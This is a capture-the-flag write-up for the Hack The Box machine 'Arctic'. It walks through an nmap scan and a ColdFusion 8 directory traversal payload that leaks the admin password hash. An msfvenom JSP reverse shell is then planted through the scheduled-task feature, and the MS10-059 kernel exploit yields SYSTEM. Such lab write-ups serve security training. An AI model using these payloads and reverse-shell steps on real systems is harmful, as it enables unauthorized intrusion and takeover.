first enumeration with nmap 

```
# Nmap 7.93 scan initiated Thu May 18 21:37:02 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 135,8500,49154 -Pn 10.10.10.11
Nmap scan report for 10.10.10.11
Host is up (0.18s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 18 21:39:25 2023 -- 1 IP address (1 host up) scanned in 143.20 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3cef4adf-938f-45bf-b8ed-40b7e96c9c33)

noticed a web server running on port `8500`, opening it on a browser we got to see to dirs.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/79262d67-745f-442c-96e7-4e25cd960869)

navigating to the first dir, got to see some hidden dirs. let's check out the `administrator` dir.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/370e740d-cc0b-468c-8d4a-476e1eb2659e)

we can see the administrator page is running an `Adobe cold fussion 8` service. let's check for exploits.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0e0a12c1-0d98-4b8c-8295-1f4f499d00a5)

with a little research, found out that it is vuln to a `Directory Traversal` attack. [exploit](https://www.exploit-db.com/exploits/14641).

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/eba38a7d-5d9c-4b50-ac2d-2d8f6cc7a395)

using payload `/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en` we're able to read the password hash of this service. let's crack this hash.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/090e82e0-2224-452b-802e-e8a22a677aa7)

using an online hash cracker, we are able to crack the hash. `happyday`. let's login using this password.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/aa927087-fd9f-4081-9aec-76e006b3eafa)

cool we're in the administrator panel, let's play around and find a way to get shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b1c6b682-a440-4b45-88a3-143766222ec4)

navigate to the task schedule button and click schedule new task button.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Artic]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=445 -f raw -o shell.jsp
Payload size: 1496 bytes
Saved as: shell.jsp
```
first we generate a jsp reverse shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0feb9ac2-e596-4183-96f5-e2e6197440b1)

add a new task, set up a python listener, so it will download the shell and output it to the dir `C:\ColdFusion8\wwwroot\CFIDE\shell.jsp`. click on submit

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/89043d60-36f0-415b-abc3-e2b66670c687)

fire up ncat listener and hit the run button. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9616bf24-762e-499f-a1c4-568f4a8efe25)

now let's navigat to the uploaded payload so it will trigger a reverse shell.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Artic]
└─$ ncat -lnvp 445                                                                 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::445
Ncat: Listening on 0.0.0.0:445
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:49589.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>
```
check back ncat listener and Boom we got reverse shell as `arctic\tolis`


## Privilege Escalation

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3bfceef4-c244-49e3-b303-b6fad22d91a8)

first check `systeminfo`, copy the output of systeminfo into a file and save it.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7d2bd673-4150-4c8e-84c1-989dbfd4aca3)

ran windows-exploit-suggester found [here](https://github.com/AonCyberLabs/Windows-Exploit-Suggester). we can see so many kernel exploit we can use. let's use `MS10-059`. which you can find [windows-exploit](https://github.com/ASR511-OO7/windows-kernel-exploits/tree/master/MS10-059).

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b45d36f7-d1fc-4e37-af71-dba22159e491)

Download the exe file, and send to the target.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/53215f8a-46f2-4f0b-bdd5-8129b853ca4e)

ran the exploit and boom got a reverse shell as `nt authority\system`





